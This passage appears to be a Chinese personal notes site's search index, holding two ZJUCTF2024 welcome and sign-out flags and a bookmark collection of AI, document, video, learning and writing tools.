<p>ZJUCTF{WElc0m3_7o_ZJUCTF2024_4ND_H0P3_Y0U_ENjoy_the_6aM3}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/WELCOME/#_3","title":"\u7b7e\u9000","text":"<p>\u586b\u5b8c\u95ee\u5377 \u5373\u53ef</p> <p>Flag</p> <p><code>ZJUCTF{thaNk5_fOR_Y0Ur_P4r71C1pA7iOn_anD_w1Sh_Y0u_3NDLe5S_sUcc3$5}</code></p>","tags":["notes","ctf"]},{"location":"collection/","title":"Collection","text":"<p>\u6709\u65f6\u5019\u611f\u89c9\u6536\u96c6\u662f\u4e00\u4ef6\u633a\u6709\u610f\u601d\u7684\u4e8b\u60c5\uff0c\u5c06\u5927\u5927\u5c0f\u5c0f\u7684\u4e1c\u897f\u90fd\u6536\u96c6\u8d77\u6765\uff0c\u4e0d\u4e00\u5b9a\u6709\u7528\uff0c\u4f46\u662f\u4e5f\u662f\u4e00\u79cd\u559c\u60a6\u3002</p> <p>\u81ea\u5df1\u8d77\u521d\u6709\u6536\u96c6\u3001\u6574\u7406\u4e66\u7b7e\u7684\u4e60\u60ef\uff0c\u73b0\u5728\u6d4f\u89c8\u5668\u4e0a\u4e5f\u662f\u6ee1\u6ee1\u4e00\u6392\uff0c\u751a\u81f3\u6709\u4eba\u53d1\u73b0\u5e76\u8bf7\u6211\u5c06\u4e66\u7b7e\u5bfc\u51fa\u7ed9\u4ed6\uff1b\u4e66\u7b7e\u672c\u8d28\u4e0a\u4e5f\u5c31\u662f\u4e00\u7fa4\u8d85\u94fe\u63a5\uff0c\u6240\u4ee5\u6211\u6253\u7b97\u5c06\u6bd4\u8f83\u6709\u7528\u7684\u6574\u7406\u51fa\u6765\u653e\u5728\u8fd9\u91cc\uff0c\u540c\u65f6\u4e5f\u8ba9\u6211\u7684\u6d4f\u89c8\u5668\u66f4\u52a0\u6e05\u723d\u4e00\u4e9b\u3002</p> collection          <ul> <li> Data_Visualization  88  0 mins              1740043260 </li> <li> note_link  1187  4 mins              1740028248 </li> <li> Tools  2164  2  7 mins              1740028248 </li> <li> articles  54  0 mins              1739718485 </li> <li> teachyourselfcs  975  3 mins              1739718485 </li> <li> CTF tools  0  0 mins              0 </li> </ul>"},{"location":"collection/CTF%20tools/","title":"CTF tools","text":"<p>CTF \u603b\u662f\u5728\u627e\u5de5\u5177\u7684\u8def\u4e0a\uff1f\u7528\u8fc7\u8001\u662f\u4e0d\u8bb0\u5f97\u5728\u54ea\u4e86\uff0c\u8fd9\u91cc\u7559\u4e2a\u5907\u5fd8\uff1b\u5176\u4ed6\u53ef\u80fd\u6709\u7528\u7684\u4e1c\u897f\u4e5f\u653e\u8fd9\u5427\u3002</p> <p>\u5df2\u8fc1\u79fb\u81f3 CTF&gt;Tools \u3002</p>","tags":["collection"]},{"location":"collection/Data_Visualization/","title":"Data Visualization","text":"","tags":["collection"]},{"location":"collection/Data_Visualization/#tutorial","title":"Tutorial","text":"","tags":["collection"]},{"location":"collection/Data_Visualization/#data","title":"Data","text":"<ul> <li>\u6570\u636e\u79d1\u5b66\u548c\u673a\u5668\u5b66\u4e60</li> </ul>","tags":["collection"]},{"location":"collection/Data_Visualization/#visualization","title":"Visualization","text":"","tags":["collection"]},{"location":"collection/Data_Visualization/#seaborn","title":"seaborn","text":"<ul> <li>Python\u53ef\u89c6\u5316 | Seaborn5\u5206\u949f\u5165\u95e8</li> <li>Seaborn</li> </ul>","tags":["collection"]},{"location":"collection/Data_Visualization/#pyecharts","title":"pyecharts","text":"<ul> <li>\u3010pyecharts\u6559\u7a0b\u3011</li> <li>Pyecharts</li> </ul>","tags":["collection"]},{"location":"collection/Data_Visualization/#easyshu","title":"easyshu","text":"<ul> <li>easyshu</li> </ul>","tags":["collection"]},{"location":"collection/Data_Visualization/#gallery","title":"Gallery","text":"<ul> <li>echarts</li> <li>https://python-graph-gallery.com/ or https://www.data-to-viz.com/</li> <li>https://seaborn.pydata.org/examples/index.html</li> <li>https://matplotlib.org/stable/gallery/</li> <li>Matplotlib\u53ef\u89c6\u5316\u6700\u6709\u4ef7\u503c\u768450\u4e2a\u56fe\u8868</li> </ul>","tags":["collection"]},{"location":"collection/Data_Visualization/#tools","title":"Tools","text":"<ul> <li>\u5de5\u5177\u6536\u96c6<ul> <li>\u5728\u7ebf\u624b\u5199\u98ce\u683c\u4f5c\u56fe\u767d\u677f\u00a0Excalidraw</li> <li>GLSL\u00a0\u6d41\u4f53\u573a\u53ef\u89c6\u5316\u00a0Field Play</li> </ul> </li> <li>\u7b97\u6cd5\u6c47\u603b</li> <li>mycolor<ul> <li>\u914d\u8272</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/","title":"Tools","text":"<p>\u7ecf\u5e38\u6027\u7684\u4f1a\u7528\u4e86\u67d0\u4e9b\u4e1c\u897f\uff0c\u4e4b\u540e\u518d\u627e\u592a\u56f0\u96be\u4e86\uff0c\u505a\u7b14\u8bb0\u5199\u6587\u7ae0\u6ca1\u6709\u5fc5\u8981\uff0c\u653e\u4e66\u7b7e\u91cc\u53c8\u592a\u591a\u4e86\uff0c\u6240\u4ee5\u6253\u7b97\u96c6\u4e2d\u653e\u5728\u8fd9\u91cc\uff0c\u4e0d\u5b9a\u671f\u66f4\u65b0\u3002</p> <p>PS: \u5206\u7c7b\u5e26\u6709\u4e2a\u4eba\u4e3b\u89c2\u5224\u65ad\uff0c\u90e8\u5206\u9700\u8981\u9b54\u6cd5\uff0c\u4e0d\u52a0\u6807\u6ce8\u3002</p>","tags":["collection"]},{"location":"collection/Tools/#i","title":"I \u5728\u7ebf\u7f51\u7ad9","text":"","tags":["collection"]},{"location":"collection/Tools/#i1-ai","title":"I.1 AI","text":"","tags":["collection"]},{"location":"collection/Tools/#i11-gpt","title":"I.1.1 GPT","text":"<p>\u5b98\u7f51\u672c\u8eab\u5c31\u8fc7\u591a\u4e0d\u4ecb\u7ecd\u4e86\uff0c\u60f3\u7528\u5c31\u5f88\u597d\u641c\uff0c\u8fd9\u91cc\u4e3a\u6211\u4eec\u6536\u96c6\u597d\u4e86\uff0c\u8fd9\u91cc\u53ea\u4f1a\u52a0\u51e0\u4e2a\u4e2a\u4eba\u8ba4\u4e3a\u6bd4\u8f83\u597d\u7528\u7684\uff1b\u53ea\u8003\u8651\u4e86\u767d\u5ad6\u60c5\u51b5\u3002\u80fd\u591f\u767d\u5ad6\u7684\u800c\u4e0d\u9650\u989d\u5ea6\u7684\u6a21\u578b\uff0c\u662f\u4e0d\u662f\u771f\u5b9e\u6807\u6ce8\u7684\u90a3\u4e2a\u5c31\u4e0d\u597d\u8bf4\u4e86\u3002</p> <p>\u4e0b\u9762\u5217\u4e3e\u8fd9\u4e48\u591a\u4e0d\u662f\u8bf4\u90fd\u8981\u7528\uff0c\u800c\u662f\u770b\u80fd\u6253\u5f00\u54ea\u4e2a\u7528\u54ea\u4e2a\uff0c\u80fd\u529b\u4e3b\u8981\u53d6\u51b3\u4e8e\u6a21\u578b\uff0c\u800c\u4e0d\u662f\u7f51\u7ad9\uff1b\u4e0d\u59a8\u90fd\u4f53\u9a8c\u4e00\u4e0b\uff0c\u4e0b\u9762\u4fe1\u606f\u622a\u6b62\u4e8e 2024/09/01\u3002</p>","tags":["collection"]},{"location":"collection/Tools/#i111-no-fire-wall","title":"I.1.1.1 NO fire wall","text":"<ul> <li>Chandler<ul> <li>\u968f\u610f\u4f7f\u7528 Standard \u4e2d\u7684\u6a21\u578b\uff0c\u5305\u62ec GPT-4o-Mini\uff1b</li> <li>\u4e00\u5b9a\u989d\u5ea6\u7684 Advanced \u6a21\u578b\uff0c\u5305\u62ec GPT-4o\uff0cClaude3.5-sonnet\u3002</li> </ul> </li> <li>AIGC+<ul> <li>\u53ef\u4ee5\u514d\u8d39\u7528 GPT-4o \u548c GPT-4o-Mini \u7684 Free \u7248\u672c\uff1b</li> <li>\u611f\u89c9\u8d28\u91cf\u8fd8\u53ef\u4ee5\uff0c\u81f3\u4e8e\u4ec0\u4e48\u662f Free \u7248\u672c\u5c31\u4e0d\u597d\u8bf4\u4e86\u3002</li> </ul> </li> <li>\u667a\u8c31\u6e05\u8a00<ul> <li>\u5904\u7406\u6587\u4ef6\u80fd\u529b\u8fd8\u884c\uff1b</li> </ul> </li> <li>Deepseek<ul> <li>\u56fd\u4ea7\u6a21\u578b\uff0c\u5176 coder \u8fd8\u4e0d\u9519\uff0cchat \u6a21\u578b\u4f7f\u7528\u4e0d\u591a\u3002</li> </ul> </li> <li>Zchat<ul> <li>ZJU \u8d26\u53f7\u767b\u5165\u3002</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i112-fire-wall","title":"I.1.1.2 Fire wall","text":"<ul> <li>theb<ul> <li>\u5de6\u4fa7\u53ef\u9009\u514d\u8d39\u6a21\u578b\uff0c\u622a\u81f3 2024/08/03\uff0c\u5305\u62ec\uff1aGemma 2 9B/Claude 3 Haiku/Llama 3.1 8B/GPT-4o Mini \u7b49\u53ef\u4efb\u610f\u4f7f\u7528\u3002</li> </ul> </li> <li>POE<ul> <li>\u53ef\u4ee5\u4f7f\u7528\u524d\u6cbf\u5927\u6a21\u578b\uff0c\u6bcf\u5929 3000 \u79ef\u5206\uff1a<ul> <li>GPT-4o-Mini 15/\u6b21</li> <li>GPT-4o 300/\u6b21</li> <li>Claude-3.5-Sonnet 200/\u6b21</li> </ul> </li> <li>\u5f53\u7136\u8fd8\u6709\u5176\u4ed6\u6a21\u578b\uff0c\u81ea\u67e5\u3002</li> </ul> </li> <li>Coze<ul> <li>\u56fd\u5185\u53eb\u6263\u5b50\uff0c\u672c\u6765\u662f\u767d\u5ad6\u795e\u5668\uff0c\u540e\u6765\u9650\u989d\u592a\u4e25\u91cd\u4e86\uff0c\u4e2a\u4eba\u653e\u5f03</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i12","title":"I.1.2 \u641c\u7d22","text":"<ul> <li>Devv<ul> <li>\u201c\u6700\u61c2\u7a0b\u5e8f\u5458\u7684\u65b0\u4e00\u4ee3 AI \u641c\u7d22\u5f15\u64ce\u201d\uff1b</li> <li>\u57fa\u4e8e\u56fd\u5916\u641c\u7d22\u5f15\u64ce\uff0c\u9002\u5408\u95ee\u7b54\uff0c\u5899\u5916\u3002</li> </ul> </li> <li>metaso<ul> <li>\u57fa\u4e8e\u56fd\u5185\u641c\u7d22\u5f15\u64ce\uff0c\u9002\u5408\u68b3\u7406\u3002</li> </ul> </li> <li>iAsk<ul> <li>\u4e5f\u662f\u4e00\u4e2a\u4e0d\u9519\u7684 AI \u641c\u7d22\u7f51\u7ad9\uff0c\u5927\u9646\u53ef\u7528\uff1b</li> <li>\u4e00\u4e2a\u793a\u4f8b \u3002</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i13","title":"I.1.3 \u5176\u4ed6","text":"<ul> <li>On vscode:<ul> <li>GitHub Copilot</li> <li>Cody: AI Coding Assistant with Autocomplete &amp; Chat</li> </ul> </li> <li>Anakin<ul> <li>\u672c\u8eab\u662f\u4e00\u4e2a\u96c6\u6210\u5e73\u53f0\uff0c\u6211\u770b\u4e2d\u7684\u662f\u5176 artist \u90e8\u5206\u7684\u6587\u751f\u56fe\u6a21\u578b\uff1b</li> <li>\u65b0\u4eba 100 \u989d\u5ea6\uff0c\u514d\u8d39\u5957\u9910\u6bcf\u5929 30 \u7684\u989d\u5ea6\uff1b</li> <li>\u90e8\u5206\u6a21\u578b\u53ef\u514d\u8d39\u4f7f\u7528\uff0c\u4f8b\u5982 Stable Diffusion XL Base 1.0\u3002</li> </ul> </li> <li>AI short<ul> <li>AI \u63d0\u793a\u8bcd</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i2","title":"I.2 \u6587\u4ef6\u7c7b","text":"<ul> <li>123Apps<ul> <li>\u5305\u62ec\u89c6\u9891/\u97f3\u9891/PDF/\u8f6c\u6362\u5668 \u5de5\u5177</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i21-pdf","title":"I.2.1 \u6587\u6863\uff08PDF \u4e3a\u4e3b\uff09","text":"<ul> <li>\u514d\u8d39\u5728\u7ebf\u6587\u6863\u8f6c\u6362\uff0cpdf\u64cd\u4f5c<ul> <li>ILovePdf</li> <li>XPdf</li> <li>pdnob</li> <li>png2pdf</li> </ul> </li> <li>\u79bb\u7ebf\u8f6c\u6362\u5668</li> <li>pandoc<ul> <li>a universal document converter</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i22","title":"I.2.2 \u56fe\u7247","text":"<ul> <li>Canva or fotor<ul> <li>\u9002\u5408\u505a\u4e9b\u7b80\u5355\u7684\u56fe\u3002</li> </ul> </li> <li>imgbb or smms<ul> <li>\u514d\u8d39\u56fe\u5e8a\uff0c\u654f\u611f\u56fe\u7247\u5c31\u6700\u597d\u81ea\u5df1\u642d\u5efa\u56fe\u5e8a\u4e86\u3002</li> </ul> </li> <li>remove bg<ul> <li>\u80cc\u666f\u79fb\u9664/\u62a0\u56fe\u3002</li> </ul> </li> <li>artStation</li> <li>\u7a3f\u5b9a<ul> <li>\u5728\u7ebf PS</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i23","title":"I.2.3 \u89c6\u9891","text":"<ul> <li> <p>Online Video Cutter</p> <ul> <li>\u514d\u8d39\u652f\u6301\u6700\u5927 4 G \u7684\u89c6\u9891\u88c1\u526a <p>\u4e0b\u9762\u4e3b\u8981\u662f\u89c6\u9891\u5728\u7ebf\u4e0b\u8f7d\u7f51\u7ad9\uff0c\u603b\u6709\u8fd9\u4e2a\u7f51\u7ad9\u65e0\u6548\u53e6\u4e00\u4e2a\u6709\u6548\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u7559\u4e0b\u51e0\u4e2a\u6bd4\u8f83\u597d\u7528\u7684\uff0c\u529f\u80fd\u4e0a\u5177\u6709\u91cd\u590d\u6027\u3002</p> </li> </ul> </li> <li> <p>SaveTheVideo</p> <ul> <li>\u4e2a\u4eba\u4e3b\u8981\u4f7f\u7528\uff0c\u611f\u89c9\u9664\u4e86 Youtube \u90fd\u652f\u6301\u3002</li> </ul> </li> <li>Save<ul> <li>\u4e3b\u8981\u7528\u4e8e youtube \u89c6\u9891\u4e0b\u8f7d\u3002</li> </ul> </li> <li>ssyoutube</li> <li>SnapAny<ul> <li>\u7406\u8bba\u652f\u6301\u54d4\u54e9\u54d4\u54e9 TikTok Pinterest Facebook VK Snapchat Threads Suno</li> </ul> </li> <li>ParseVideo</li> <li>savefrom</li> <li>123APPS<ul> <li>\u89c6\u9891/\u97f3\u9891/PDF \u7f16\u8f91\u5de5\u5177\uff1b</li> <li>\u4f46\u662f\u4e2a\u4eba\u76ee\u524d\u53ea\u662f\u7528\u8fc7\u7f16\u8f91\u89c6\u9891\uff0c\u5176\u4ed6\u529f\u80fd\u672a\u5c1d\u8bd5\u3002</li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i3","title":"I.3 \u77e5\u8bc6\u5b66\u4e60","text":"","tags":["collection"]},{"location":"collection/Tools/#i31","title":"I.3.1 \u4e00\u4e9b\u5e73\u53f0","text":"<ul> <li>https://sagecell.sagemath.org./<ul> <li>sagemath \u5b98\u65b9\u5728\u7ebf\u7f16\u8bd1\u5668\uff1b</li> </ul> </li> <li>V2EX or segmentfault<ul> <li>\u56fd\u5185\u7a0b\u5e8f\u5458\u4ea4\u6d41\u7f51\u7ad9\uff08\u6bd4\u8f83\u6d3b\u8dc3\uff09</li> </ul> </li> <li>godbolt<ul> <li>\u514d\u8d39\u201c\u4ee3\u7801\u5e8a\u201d\uff0c\u56e0\u4e3a\u53f3\u4e0a\u89d2 share \u53ef\u4ee5\u83b7\u5f97 \u4fdd\u7559\u4ee3\u7801 \u7684\u94fe\u63a5\uff1b</li> <li>\u5728\u7ebf\u7f16\u8f91\u5668\uff0c\u53ef\u4ee5\u540c\u65f6\u5207\u6362\u4e0d\u540c\u7248\u672c\u7f16\u8bd1\u5668\u8fd0\u884c\u4ee3\u7801\uff1b</li> <li>\u652f\u6301\u5c55\u793a\u7f16\u8bd1\u5185\u5bb9\uff0c\u4f8b\u5982\u3002</li> </ul> </li> <li>LeetCode/playground or One Compiler or Github gist<ul> <li>\u201c\u4ee3\u7801\u5e8a\u201d\uff0c\u53ef\u4ee5\u5b58\u50a8\u4ee3\u7801\u5728\u8d26\u6237\u4e0a\u3002</li> </ul> </li> <li>Json</li> <li>explainshell<ul> <li>\u5e2e\u4f60\u8bfb\u61c2 shell \u6307\u4ee4</li> </ul> </li> <li>\u7f16\u7a0b\u8bcd\u5178<ul> <li>\u5e2e\u4f60\u7cfb\u7edf\u4e86\u89e3\u67d0\u4e00\u95e8\u8bed\u8a00\u9700\u8981\u4e86\u89e3\u54ea\u4e9b\u4e13\u4e1a\u672f\u8bed</li> <li>\u4ee5\u5de5\u4f5c\u4e3a\u76ee\u7684\uff0c\u4e0d\u5177\u5907\u641c\u7d22\u529f\u80fd \u4f46\u662f\u4e0d\u4f1a\u8fd8\u6709\u4eba\u4e0d\u4f1a\u7528\u4f60\u7684\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u7279\u5b9a\u7f51\u7ad9\u5427</li> </ul> </li> <li>\u82f1\u8bed\u771f\u9898\u5728\u7ebf</li> <li>\u6e05\u534e\u5927\u5b66\u5f00\u6e90\u8f6f\u4ef6\u955c\u50cf\u7ad9</li> <li>\u6d59\u6c5f\u5927\u5b66\u5f00\u6e90\u8f6f\u4ef6\u955c\u50cf\u7ad9</li> <li>\u5b89\u5168\u5bfc\u822a</li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i32","title":"I.3.2 \u6548\u7387\u63d0\u9ad8","text":"<ul> <li>geogebra<ul> <li>\u4e00\u5957\u514d\u8d39\u7684\u6570\u5b66\u5de5\u5177</li> </ul> </li> <li>wolframalpha</li> <li>mathdf</li> <li>graph_editor<ul> <li>\u56fe\u8bba\u4e2d\u7684\u4f5c\u56fe\u5de5\u5177</li> </ul> </li> <li>excalidraw<ul> <li>\u611f\u89c9\u6bd4\u8f83\u9002\u5408\u753b\u7ed3\u6784\u56fe\uff1b</li> <li>\u81ea\u5df1\u8fd8\u6ca1\u7528\u8fc7\uff0c\u4f46\u662f\u89c1\u8fc7\u6709\u4eba\u4f7f\u7528\u8fc7\uff0c\u611f\u89c9\u4e0d\u9519</li> </ul> </li> <li>processon<ul> <li>\u514d\u8d39\u5728\u7ebf\u6d41\u7a0b\u56fe\u601d\u7ef4\u5bfc\u56fe</li> </ul> </li> <li>vim_learning<ul> <li>\u5c5e\u4e8e\u662f\u5206\u4eab\u4f46\u662f\u81ea\u5df1\u8fd8\u6ca1\u7528\u8fc7(bushi)</li> </ul> </li> <li>tonycrane's \u5de5\u5177\u6536\u96c6<ul> <li>\u5728\u7ebf\u624b\u5199\u98ce\u683c\u4f5c\u56fe\u767d\u677f\u00a0Excalidraw</li> <li>GLSL\u00a0\u6d41\u4f53\u573a\u53ef\u89c6\u5316\u00a0Field Play</li> </ul> </li> <li>Ginsmooc</li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i4","title":"I.4 \u8bfb/\u5199\u6587\u7ae0","text":"","tags":["collection"]},{"location":"collection/Tools/#i41","title":"I.4.1 \u8bfb","text":"<p>\u521d\u671f\u5982\u679c\u76f4\u63a5\u770b\u7eaf\u82f1\u6587\u8bba\u6587\u6682\u65f6\u5403\u4e0d\u4f4f\uff0c\u4e0b\u9762\u662f\u4e00\u4e9b\u7f13\u5175\u4e4b\u8ba1\uff1a</p> <ul> <li>GPT \u5b66\u672f\u4f18\u5316 (GPT Academic)<ul> <li>\u6bd4\u8f83\u5389\u5bb3\u7684\u4e00\u4e2a\u529f\u80fd\u662f\uff0c\u6839\u636e arxiv \u8bba\u6587\u6458\u8981\u94fe\u63a5\uff0c\u83b7\u53d6 tex \u6e90\u7801\uff0c\u5bf9\u5176\u7ffb\u8bd1\u540e\u518d\u7f16\u8bd1\uff0c\u6240\u4ee5\u7ffb\u8bd1\u540e\u770b\u8d77\u6765\u6bd4\u76f4\u63a5\u7ffb\u8bd1 pdf \u597d\u5f88\u591a!\uff01</li> <li>\u5b66\u672f\u7248GPT \u7f51\u9875\u975e\u76c8\u5229\u7248<ul> <li>\u539f\u7248\u9700\u8981\u90e8\u7f72\u6bd4\u8f83\u9ebb\u70e6\uff0c\u8fd9\u7b97\u662f\u4e00\u4e2a\u4fbf\u643a\u7248\uff1b</li> <li>\u9488\u5bf9 arxiv:<ul> <li>\u4f7f\u7528 GPT-4o mini \u6a21\u578b\uff0c\u6bd4\u8f83\u5feb\uff0c\u6682\u65f6\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u9650\u5236\uff1b</li> <li>\u4ea7\u51fa\u4e2d\u53ef\u80fd\u6709\u4e71\u7801\uff0cmerge_translate_zh \u7248\u672c\u7684 pdf \u6548\u679c\u8f83\u597d\uff1b</li> <li>\u5982\u679c\u51fa\u73b0\u5931\u8d25\u53ef\u4ee5\u5c1d\u8bd5\u5728\u6d4f\u89c8\u5668\u9690\u79c1\u6a21\u5f0f\u4e0b\u518d\u8bd5\uff08\u539f\u56e0\u539f\u4f5c\u8005\u4e5f\u4e0d\u8be6\uff09\uff1b</li> <li>\u8fd9\u91cc -&gt; zh_Traced ICSE 24 \u662f\u4e00\u4e2a\u6210\u529f\u4f8b\u5b50\u3002</li> </ul> </li> <li>\u9488\u5bf9\u5176\u4ed6 pdf:<ul> <li>\u5c1d\u8bd5 PDF2PDF \u529f\u80fd\uff0c\u6559\u7a0b\u3002</li> </ul> </li> </ul> </li> </ul> </li> <li>\u6c89\u6d78\u5f0f\u7ffb\u8bd1<ul> <li>\u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u9605\u8bfb html \u7248\u672c\u7684\u53ef\u4ee5\u76f4\u63a5\u7ffb\u8bd1\u3002</li> </ul> </li> <li>\u6709\u9053\u7ffb\u8bd1arXiv\u8bba\u6587\u7ffb\u8bd1<ul> <li>\u65b0\u53d1\u73b0\u7684\uff0c\u4e5f\u633a\u4e0d\u9519\uff1barXiv \u4e5f\u53ef\u4ee5\u7ffb\u8bd1\u540e\u91cd\u65b0\u6392\u7248\uff1b</li> </ul> </li> <li>txyz<ul> <li>\u53ef\u4ee5\u5229\u7528\u5176\u5185\u7f6e ai \u5e2e\u52a9\u9605\u8bfb\uff08\u867d\u7136\u6211\u4ece\u6765\u6ca1\u7528\u8fc7\u5c31\u662f\u4e86\uff09\uff1b</li> <li>\u53ef\u4ee5\u5411\u9605\u8bfb\u7f51\u9875\u6587\u7ae0\u4e00\u6837\u4f7f\u7528\u6d4f\u89c8\u5668\u63d2\u4ef6\uff08\u65b9\u4fbf\u642d\u914d\u4f7f\u7528\u6d4f\u89c8\u5668\u63d2\u4ef6\uff09\u3002</li> </ul> </li> <li>Tips:\uff08\u4ee5 https://arxiv.org/abs/1502.03808 \u4e3a\u4f8b\uff09\u200b<ul> <li>\u66ff\u6362\u300cx\u300d\u4e3a\u300c5\u300d\u8df3\u8f6c\u5230 HTML \u7248\u672c\u9605\u8bfb\u200b\uff0c\u642d\u914d\u6c89\u6d78\u5f0f\u7ffb\u8bd1\u4f7f\u7528\uff1b<ul> <li>https://ar5iv.org/abs/1502.03808 \u200b</li> </ul> </li> <li>\u66ff\u6362\u300cv\u300d\u4e3a\u300cw\u300d\u8df3\u8f6c\u5230 txyz \u5904\u7406\u200b\uff1b<ul> <li>https://arxiw.org/abs/1502.03808</li> </ul> </li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i42","title":"I.4.2 \u5199","text":"<ul> <li>typst <ul> <li>\u5982\u679c\u53ea\u662f\u60f3\u5199\u4e00\u4e2a\u597d\u770b\u7684 pdf \u8bfe\u7a0b\u62a5\u544a\uff0c\u4e2a\u4eba\u8ba4\u4e3a typst \u7684\u5b66\u4e60\u6210\u672c\u8fdc\u4f4e\u4e8e latex\uff1b</li> <li>Typst_begin</li> <li>ZJU-Project-Report-Template</li> <li>\u7f3a\u70b9\u4e5f\u5f88\u660e\u663e\uff0c\u4f7f\u7528\u4e0d\u5e7f\u6cdb\uff0c\u6240\u4ee5\u89c9\u5f97\u81ea\u5df1\u5199\u5199 pdf \u62a5\u544a\u8fd8\u662f\u591f\u7528\u7684\u3002</li> </ul> </li> <li>latex <ul> <li>\u8fd9\u91cc\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u6559\u7a0b\u6587\u4ef6\uff1b</li> <li>\u4e0d\u5f97\u4e0d\u5410\u69fd\u4e00\u4e0b latex \u7684 \u5e9e\u5927\uff1b\u4f46\u662f\u57fa\u4e8e latex \u5ef6\u7eed\u5df2\u4e45\u800c\u6a21\u677f\u9887\u591a\uff0c\u6682\u4e0d\u80fd\u629b\u5f03\uff1b</li> <li>\u8fd9\u91cc \u4e22\u5f03\u4e86\u5f88\u591a\u6682\u4e0d\u9700\u8981\u7684\u5b8f\u5305\uff0c\u5982\u679c\u4ee5\u540e\u9700\u8981\u518d\u91cd\u65b0\u5b89\u88c5\uff1a<ul> <li>\u3010\u66f4\u65b0\u3011\u5982\u679c\u662f\u7ecf\u5e38\u4f7f\u7528\u4e00\u4e9b\u5176\u4ed6\u4eba\u7684\u6a21\u677f\u6216\u8005\u8fd8\u662f\u4e66\u5199\u8bba\u6587\u7b49\uff0c\u8fd8\u662f\u88c5\u4e86\u6bd4\u8f83\u597d\uff1b</li> <li>\u3010\u66f4\u65b0\u3011\u91cd\u65b0\u5b89\u88c5\u5b8f\u5305\u82b1\u4e86\u4e00\u756a\u529f\u592b\uff0c\u597d\u5728\u627e\u5230\u4e86 \u8fd9\u4e2a \u8fd9\u4e2a \u3002</li> </ul> </li> </ul> </li> </ul>","tags":["collection"]},{"location":"collection/Tools/#i5","title":"I.5 \u5176\u4ed6","text":"<ul> <li>scribbr<ul> <li>\u591a\u79cd\u8bba\u6587\u53c2\u8003\u6587\u732e\u6807\u51c6\u5f15\u7528\u751f\u6210\u5668</li> </ul> </li> <li>citationmachine<ul> <li>APA Citation Generator</li> </ul> </li> <li>DownGit or download-directory<ul> <li>\u4e0b\u8f7d\u5f00\u6e90 github \u4ed3\u5e93\u5185\u5bb9\uff0c\u6307\u54ea\u6253\u54ea\u3002</li> </ul> </li> <li>\u805a\u5408\u7ffb\u8bd1</li> <li>Scrcpy<ul> <li>\u624b\u673a\u6295\u5c4f\u7535\u8111</li> </ul> </li> <li>Zoho survey<ul> <li>\u514d\u8d39\u5728\u7ebf\u95ee\u5377</li> </ul> </li> <li>whatismyipaddress<ul> <li>\u83b7\u53d6ip \u5730\u5740</li> </ul> </li> <li>weixin filehelper</li> <li>namebeta<ul> <li>\u57df\u540d\u4ef7\u683c\u67e5\u8be2</li> </ul> </li> <li>solant<ul> <li>\u4ec0\u4e48\u662f\u6700\u597d\u7684\uff1f</li> </ul> </li> <li>ebook</li> </ul> <p>\u4e0b\u9762\u7684\u7eaf\u5a31\u4e50</p> <ul> <li>\u4fe1\u4efb\u7684\u8fdb\u5316</li> <li>chatcrypt<ul> <li>\u901f\u5f00\u533f\u540d\u804a\u5929\u5ba4</li> </ul> </li> <li>wikiHow<ul> <li>\u201c\u4e92\u8054\u7f51\u4e0a\u6700\u503c\u5f97\u4fe1\u8d56\u7684\u6307\u5357\u7f51\u7ad9\u201d</li> </ul> </li> <li>thisissand<ul> <li>\u6765\u753b\u6c99\u753b</li> </ul> </li> <li>\u77e5\u94fe<ul> <li>\u4e34\u65f6\u7f29\u77ed\u94fe\u63a5</li> </ul> </li> <li>\u7e41\u7b80\u4e2d\u6587\u8f6c\u6362</li> <li>trace \u756a</li> <li>\u6a31\u82b1\u52a8\u6f2b6</li> <li>\u6b21\u5143\u72d7</li> <li>stars<ul> <li>\u4e00\u8d77\u6765\u770b\u661f\u661f</li> </ul> </li> <li>The Scale of the Universe<ul> <li>\u4f60\u77e5\u9053\u5b87\u5b99\u6709\u591a\u5927\u5417\uff1f</li> </ul> </li> <li>Emoji</li> <li>knowsex</li> </ul>","tags":["collection"]},{"location":"collection/Tools/#ii","title":"II \u8f6f\u4ef6\u63a8\u8350","text":"<ul> <li>Chrome browser<ul> <li>chrome_begin<ul> <li>\u4e3b\u8981\u662f\u6269\u5c55\u7a0b\u5e8f\u63a8\u8350\uff1b</li> </ul> </li> <li>\u6709\u4e00\u4e2a\u8c37\u6b4c\u8d26\u53f7\u4f53\u9a8c\u66f4\u4f73\u3002</li> </ul> </li> <li>visual studio code</li> <li>everything<ul> <li>\u5feb\u901f\u641c\u5bfb\u5404\u79cd\u6587\u4ef6\u6837\u4f8b\uff0c\u652f\u6301\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff1b</li> <li>\u4f7f\u7528\u8f83\u5c11\u5b89\u88c5\u4fbf\u643a\u7248\u5373\u53ef\u3002</li> </ul> </li> <li>utools<ul> <li>\u6781\u529b\u63a8\u8350\uff0c\u914d\u7f6e\u597d\u540e\u4e2a\u4eba\u4f7f\u7528\u4f53\u9a8c\u6781\u4f73\uff1b</li> <li>Utools_begin</li> </ul> </li> <li>obsidian<ul> <li>\u8f7b\u91cf\u5316 markdown \u7b14\u8bb0\u8f6f\u4ef6\uff0c\u672c\u5730\u90e8\u7f72\uff0c\u652f\u6301\u591a\u79cd\u63d2\u4ef6\uff0c\u7c7b\u4f3c\u4e8e vscode\uff0c\u53ef\u4ee5\u6781\u5177\u4e2a\u6027\u5316\uff1b</li> <li>Obsidian_begin</li> <li>Obsidian \u63d2\u4ef6\u96c6\u5e02</li> </ul> </li> <li>sunshine+moonlight<ul> 